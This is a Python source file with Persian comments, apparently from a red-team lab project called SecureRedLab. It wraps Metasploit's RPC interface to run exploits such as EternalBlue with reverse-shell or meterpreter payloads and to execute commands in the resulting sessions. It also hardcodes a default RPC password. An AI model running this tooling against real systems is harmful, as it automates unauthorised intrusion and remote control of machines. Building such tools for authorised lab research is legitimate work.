"""
SecureRedLab - Metasploit Wrapper
پوشش Python برای Metasploit Framework

این ماژول یک واسط Python برای استفاده از Metasploit Framework فراهم می‌کند.
همه حملات از طریق API RPC Metasploit اجرا می‌شوند.

Features:
- اتصال به msfrpcd (Metasploit RPC Daemon)
- اجرای exploits با AI payload generation
- مدیریت sessions
- اسکن و شناسایی آسیب‌پذیری‌ها
- گزارش نتایج به صورت structured

Legal Warning:
این ابزار فقط برای تحقیقات آکادمیک و با مجوز FBI, IRB, Police است.
استفاده غیرمجاز غیرقانونی است.
"""

import time
import json
import threading
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
import subprocess
import socket

try:
    from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError
    PYMETASPLOIT_AVAILABLE = True
except ImportError:
    PYMETASPLOIT_AVAILABLE = False
    print("⚠️  pymetasploit3 not available - using mock mode")

# Core imports
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from core.logging_system import get_logger, LogCategory
from core.exception_handler import (
    handle_exception,
    retry_on_failure,
    log_performance,
    NetworkException,
    ErrorSeverity,
    RecoveryStrategy
)

# ============================================================================
# Data Classes & Enums
# ============================================================================

class ExploitStatus(Enum):
    """وضعیت exploit"""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    TIMEOUT = "timeout"


class SessionType(Enum):
    """نوع session"""
    METERPRETER = "meterpreter"
    SHELL = "shell"
    POWERSHELL = "powershell"


@dataclass
class ExploitConfig:
    """پیکربندی exploit"""
    exploit_name: str                    # نام exploit (مثل: exploit/windows/smb/ms17_010_eternalblue)
    target_host: str                     # IP هدف
    target_port: int                     # پورت هدف
    payload: str = "generic/shell_reverse_tcp"  # Payload
    lhost: str = "0.0.0.0"              # Local host برای reverse connection
    lport: int = 4444                    # Local port
    options: Dict[str, Any] = None       # گزینه‌های اضافی
    timeout: int = 300                   # Timeout به ثانیه
    ai_generated_payload: bool = False   # آیا payload توسط AI تولید شده؟
    
    def __post_init__(self):
        if self.options is None:
            self.options = {}


@dataclass
class ExploitResult:
    """نتیجه اجرای exploit"""
    exploit_name: str
    target: str
    status: ExploitStatus
    session_id: Optional[int] = None
    session_type: Optional[SessionType] = None
    execution_time: float = 0.0
    output: str = ""
    error: Optional[str] = None
    vulnerability_confirmed: bool = False
    timestamp: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        """تبدیل به dictionary"""
        return {
            "exploit_name": self.exploit_name,
            "target": self.target,
            "status": self.status.value,
            "session_id": self.session_id,
            "session_type": self.session_type.value if self.session_type else None,
            "execution_time": self.execution_time,
            "output": self.output,
            "error": self.error,
            "vulnerability_confirmed": self.vulnerability_confirmed,
            "timestamp": self.timestamp
        }


# ============================================================================
# Metasploit Wrapper Class
# ============================================================================

class MetasploitWrapper:
    """
    Wrapper اصلی برای Metasploit Framework
    
    این کلاس یک واسط Python برای Metasploit فراهم می‌کند.
    """
    
    def __init__(
        self,
        msfrpc_host: str = "metasploit",
        msfrpc_port: int = 55553,
        msfrpc_password: str = "msf_rpc_password",
        docker_container: str = "secureredlab_metasploit",
        timeout: int = 300
    ):
        """
        Initialize Metasploit wrapper
        
        Args:
            msfrpc_host: هاست msfrpcd
            msfrpc_port: پورت msfrpcd
            msfrpc_password: پسورد msfrpcd
            docker_container: نام Docker container
            timeout: Timeout اتصال
        """
        self.msfrpc_host = msfrpc_host
        self.msfrpc_port = msfrpc_port
        self.msfrpc_password = msfrpc_password
        self.docker_container = docker_container
        self.timeout = timeout
        
        self.logger = get_logger(LogCategory.SYSTEM)
        self.client: Optional[MsfRpcClient] = None
        self.sessions: Dict[int, Dict] = {}
        self._lock = threading.Lock()
        
        # اتصال اولیه
        self._connect()
    
    @retry_on_failure(max_retries=3, delay=2.0)
    @handle_exception(
        recovery_strategy=RecoveryStrategy.LOG,
        fallback_value=None
    )
    def _connect(self) -> bool:
        """
        اتصال به msfrpcd
        
        Returns:
            bool: موفقیت اتصال
        """
        if not PYMETASPLOIT_AVAILABLE:
            self.logger.warning("⚠️  Metasploit wrapper در حالت Mock است")
            return True
        
        try:
            self.logger.info(f"🔌 Connecting to Metasploit RPC at {self.msfrpc_host}:{self.msfrpc_port}...")
            
            self.client = MsfRpcClient(
                password=self.msfrpc_password,
                server=self.msfrpc_host,
                port=self.msfrpc_port,
                ssl=False
            )
            
            # تست اتصال
            version = self.client.core.version()
            self.logger.info(f"✅ Connected to Metasploit {version.get('version', 'unknown')}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Failed to connect to Metasploit: {str(e)}")
            raise NetworkException(
                f"Cannot connect to Metasploit RPC: {str(e)}",
                persian_message=f"اتصال به Metasploit RPC ناموفق بود: {str(e)}",
                context={"host": self.msfrpc_host, "port": self.msfrpc_port}
            )
    
    @log_performance(category="metasploit")
    @handle_exception(
        recovery_strategy=RecoveryStrategy.LOG,
        fallback_value=None
    )
    def run_exploit(self, config: ExploitConfig) -> ExploitResult:
        """
        اجرای یک exploit
        
        Args:
            config: پیکربندی exploit
            
        Returns:
            ExploitResult: نتیجه اجرا
        """
        start_time = time.time()
        
        self.logger.info(
            f"🎯 Running exploit: {config.exploit_name} against {config.target_host}:{config.target_port}"
        )
        
        # Mock mode
        if not PYMETASPLOIT_AVAILABLE or self.client is None:
            self.logger.warning("⚠️  Running exploit in MOCK mode")
            return self._mock_exploit_execution(config, start_time)
        
        try:
            # ساخت exploit object
            exploit = self.client.modules.use('exploit', config.exploit_name)
            
            # تنظیم options پایه
            exploit['RHOST'] = config.target_host
            exploit['RPORT'] = config.target_port
            
            # تنظیم payload
            payload = self.client.modules.use('payload', config.payload)
            payload['LHOST'] = config.lhost
            payload['LPORT'] = config.lport
            
            # تنظیم options اضافی
            for key, value in config.options.items():
                if key in exploit.options:
                    exploit[key] = value
            
            self.logger.info(f"⚙️  Exploit configured - executing...")
            
            # اجرای exploit
            result = exploit.execute(payload=payload)
            
            execution_time = time.time() - start_time
            
            # بررسی نتیجه
            if result and 'job_id' in result:
                job_id = result['job_id']
                self.logger.info(f"✅ Exploit executed successfully (Job ID: {job_id})")
                
                # بررسی session
                time.sleep(2)  # انتظار برای ایجاد session
                sessions = self.client.sessions.list
                
                if sessions:
                    session_id = list(sessions.keys())[0]
                    session_info = sessions[session_id]
                    
                    self.logger.info(f"🎉 Session {session_id} opened!")
                    
                    return ExploitResult(
                        exploit_name=config.exploit_name,
                        target=f"{config.target_host}:{config.target_port}",
                        status=ExploitStatus.SUCCESS,
                        session_id=session_id,
                        session_type=SessionType.METERPRETER if 'meterpreter' in session_info.get('type', '') else SessionType.SHELL,
                        execution_time=execution_time,
                        output=json.dumps(session_info, indent=2),
                        vulnerability_confirmed=True,
                        timestamp=time.time()
                    )
                else:
                    return ExploitResult(
                        exploit_name=config.exploit_name,
                        target=f"{config.target_host}:{config.target_port}",
                        status=ExploitStatus.FAILED,
                        execution_time=execution_time,
                        output="No session created",
                        error="Exploit executed but no session was established",
                        vulnerability_confirmed=False,
                        timestamp=time.time()
                    )
            else:
                return ExploitResult(
                    exploit_name=config.exploit_name,
                    target=f"{config.target_host}:{config.target_port}",
                    status=ExploitStatus.FAILED,
                    execution_time=execution_time,
                    output=str(result),
                    error="Exploit execution failed",
                    vulnerability_confirmed=False,
                    timestamp=time.time()
                )
                
        except MsfRpcError as e:
            execution_time = time.time() - start_time
            self.logger.error(f"❌ Metasploit RPC error: {str(e)}")
            
            return ExploitResult(
                exploit_name=config.exploit_name,
                target=f"{config.target_host}:{config.target_port}",
                status=ExploitStatus.FAILED,
                execution_time=execution_time,
                error=str(e),
                vulnerability_confirmed=False,
                timestamp=time.time()
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            self.logger.error(f"❌ Exploit execution error: {str(e)}", exc_info=True)
            
            return ExploitResult(
                exploit_name=config.exploit_name,
                target=f"{config.target_host}:{config.target_port}",
                status=ExploitStatus.FAILED,
                execution_time=execution_time,
                error=str(e),
                vulnerability_confirmed=False,
                timestamp=time.time()
            )
    
    def _mock_exploit_execution(self, config: ExploitConfig, start_time: float) -> ExploitResult:
        """
        شبیه‌سازی اجرای exploit (برای تست بدون Metasploit واقعی)
        """
        import random
        
        # شبیه‌سازی زمان اجرا
        time.sleep(random.uniform(1.0, 3.0))
        execution_time = time.time() - start_time
        
        # 70% موفقیت
        success = random.random() < 0.7
        
        if success:
            session_id = random.randint(1, 100)
            return ExploitResult(
                exploit_name=config.exploit_name,
                target=f"{config.target_host}:{config.target_port}",
                status=ExploitStatus.SUCCESS,
                session_id=session_id,
                session_type=SessionType.METERPRETER,
                execution_time=execution_time,
                output=f"[MOCK] Session {session_id} opened successfully",
                vulnerability_confirmed=True,
                timestamp=time.time()
            )
        else:
            return ExploitResult(
                exploit_name=config.exploit_name,
                target=f"{config.target_host}:{config.target_port}",
                status=ExploitStatus.FAILED,
                execution_time=execution_time,
                output="[MOCK] Exploit execution failed",
                error="Target may not be vulnerable",
                vulnerability_confirmed=False,
                timestamp=time.time()
            )
    
    def list_exploits(self, search_term: str = "") -> List[str]:
        """
        لیست exploits موجود
        
        Args:
            search_term: کلمه کلیدی برای جستجو
            
        Returns:
            لیست نام exploits
        """
        if not PYMETASPLOIT_AVAILABLE or self.client is None:
            # Mock data
            return [
                "exploit/windows/smb/ms17_010_eternalblue",
                "exploit/multi/http/apache_log4j",
                "exploit/linux/http/apache_cve_2021_41773",
                "exploit/unix/webapp/php_cgi_arg_injection"
            ]
        
        try:
            all_exploits = self.client.modules.exploits
            
            if search_term:
                return [e for e in all_exploits if search_term.lower() in e.lower()]
            else:
                return all_exploits[:50]  # محدودیت برای عملکرد بهتر
                
        except Exception as e:
            self.logger.error(f"❌ Failed to list exploits: {str(e)}")
            return []
    
    def get_sessions(self) -> Dict[int, Dict]:
        """
        دریافت لیست sessions فعال
        
        Returns:
            دیکشنری sessions
        """
        if not PYMETASPLOIT_AVAILABLE or self.client is None:
            return self.sessions
        
        try:
            return self.client.sessions.list
        except Exception as e:
            self.logger.error(f"❌ Failed to get sessions: {str(e)}")
            return {}
    
    def execute_command(self, session_id: int, command: str) -> str:
        """
        اجرای دستور در یک session
        
        Args:
            session_id: شناسه session
            command: دستور برای اجرا
            
        Returns:
            خروجی دستور
        """
        if not PYMETASPLOIT_AVAILABLE or self.client is None:
            return f"[MOCK] Command '{command}' executed in session {session_id}"
        
        try:
            session = self.client.sessions.session(session_id)
            result = session.run_with_output(command)
            return result
            
        except Exception as e:
            self.logger.error(f"❌ Failed to execute command: {str(e)}")
            return f"Error: {str(e)}"
    
    def close_session(self, session_id: int) -> bool:
        """
        بستن یک session
        
        Args:
            session_id: شناسه session
            
        Returns:
            موفقیت عملیات
        """
        if not PYMETASPLOIT_AVAILABLE or self.client is None:
            if session_id in self.sessions:
                del self.sessions[session_id]
            return True
        
        try:
            session = self.client.sessions.session(session_id)
            session.stop()
            self.logger.info(f"✅ Session {session_id} closed")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Failed to close session: {str(e)}")
            return False
    
    def disconnect(self):
        """قطع اتصال از Metasploit"""
        if self.client:
            try:
                # بستن تمام sessions
                for session_id in self.get_sessions().keys():
                    self.close_session(session_id)
                
                self.logger.info("✅ Disconnected from Metasploit")
            except Exception as e:
                self.logger.error(f"❌ Error during disconnect: {str(e)}")


# ============================================================================
# Singleton Instance
# ============================================================================

_metasploit_instance: Optional[MetasploitWrapper] = None
_metasploit_lock = threading.Lock()


def get_metasploit_wrapper() -> MetasploitWrapper:
    """
    دریافت singleton instance از MetasploitWrapper
    
    Returns:
        MetasploitWrapper instance
    """
    global _metasploit_instance
    
    if _metasploit_instance is None:
        with _metasploit_lock:
            if _metasploit_instance is None:
                _metasploit_instance = MetasploitWrapper()
    
    return _metasploit_instance


# ============================================================================
# Test - فقط برای development
# ============================================================================

if __name__ == "__main__":
    print("=" * 80)
    print("Testing Metasploit Wrapper")
    print("=" * 80)
    
    # ساخت wrapper
    msf = get_metasploit_wrapper()
    
    # تست لیست exploits
    print("\n1. Testing list_exploits()...")
    exploits = msf.list_exploits("smb")
    print(f"Found {len(exploits)} SMB exploits")
    for exploit in exploits[:5]:
        print(f"  - {exploit}")
    
    # تست اجرای exploit (Mock mode)
    print("\n2. Testing run_exploit() (Mock mode)...")
    config = ExploitConfig(
        exploit_name="exploit/windows/smb/ms17_010_eternalblue",
        target_host="target-sqli",
        target_port=445,
        payload="windows/x64/meterpreter/reverse_tcp",
        lhost="172.20.0.100",
        lport=4444
    )
    
    result = msf.run_exploit(config)
    print(f"Status: {result.status.value}")
    print(f"Execution time: {result.execution_time:.2f}s")
    if result.session_id:
        print(f"Session ID: {result.session_id}")
    
    print("\n✅ All tests completed!")
